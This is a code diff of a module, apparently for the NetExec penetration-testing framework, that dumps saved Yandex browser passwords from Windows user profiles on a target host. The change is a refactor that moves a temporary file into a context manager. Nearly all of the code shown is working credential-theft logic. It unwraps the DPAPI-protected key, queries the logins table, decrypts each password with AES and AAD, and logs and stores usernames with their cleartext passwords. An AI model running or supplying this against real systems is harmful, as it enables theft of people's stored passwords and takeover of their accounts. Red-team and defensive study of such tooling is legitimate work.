@@ -57,7 +57,8 @@ class NXCModule:
         # Filter out false positives and return valid user directories
         for d in dirs:
             if d.get_longname() not in false_positives and d.is_directory():
-                users.append(d.get_longname())
+                username = d.get_longname()
+                users.append(username)
         return users
 
     def get_key_from_local_state(self, context, state_data):
@@ -160,45 +161,45 @@ class NXCModule:
                     continue
 
                 # Temporarily save the DB blob to a local file for SQLite access
-                fh = NamedTemporaryFile(delete=True)
-                fh.write(db_data)
-                fh.seek(0)
+                with NamedTemporaryFile() as fh:
+                    fh.write(db_data)
+                    fh.seek(0)
 
-                with connect(fh.name) as conn_sqlite:
-                    # Extract AES encryption key for entries in this DB
-                    cursor = conn_sqlite.cursor()
-                    enc_key = self.extract_enc_key(context, cursor, decrypted_key)
-                    if not enc_key:
-                        continue
-
-                    # Fetch login entries from the 'logins' table
-                    cursor.execute(
-                        "SELECT origin_url, username_element, username_value, "
-                        "password_element, password_value, signon_realm FROM logins"
-                    )
-                    for (
-                        url,
-                        username_element,
-                        username,
-                        password_element,
-                        password,
-                        signon_realm,
-                    ) in cursor.fetchall():
-                        if not password:
+                    with connect(fh.name) as conn_sqlite:
+                        # Extract AES encryption key for entries in this DB
+                        cursor = conn_sqlite.cursor()
+                        enc_key = self.extract_enc_key(context, cursor, decrypted_key)
+                        if not enc_key:
                             continue
-
-                        # Construct AAD (Additional Authenticated Data)
-                        aad_string = f"{url}\0{username_element}\0{username}\0{password_element}\0{signon_realm}"
-                        aad = SHA1.new(aad_string.encode()).digest()
-                        # Decrypt the password
-                        decrypted_pwd = self.decrypt_password(enc_key, password, aad)
-                        # Log and store decrypted credentials in database
-                        url = url + " -" if url else "-"
-                        context.log.highlight(f"[{winuser}] {url} {username}:{decrypted_pwd}")
-
-                        context.db.add_dpapi_secrets(
-                            self.target, "YANDEX", winuser, username, decrypted_pwd, url
+                        
+                        # Fetch login entries from the 'logins' table
+                        cursor.execute(
+                            "SELECT origin_url, username_element, username_value, "
+                            "password_element, password_value, signon_realm FROM logins"
                         )
+                        for (
+                            url,
+                            username_element,
+                            username,
+                            password_element,
+                            password,
+                            signon_realm,
+                        ) in cursor.fetchall():
+                            if not password:
+                                continue
+                            
+                            # Construct AAD (Additional Authenticated Data)
+                            aad_string = f"{url}\0{username_element}\0{username}\0{password_element}\0{signon_realm}"
+                            aad = SHA1.new(aad_string.encode()).digest()
+                            # Decrypt the password
+                            decrypted_pwd = self.decrypt_password(enc_key, password, aad)
+                            # Log and store decrypted credentials in database
+                            url = url + " -" if url else "-"
+                            context.log.highlight(f"[{winuser}] {url} {username}:{decrypted_pwd}")
+    
+                            context.db.add_dpapi_secrets(
+                                self.target, "YANDEX", winuser, username, decrypted_pwd, url
+                            )
 
     def on_admin_login(self, context, connection):
         """
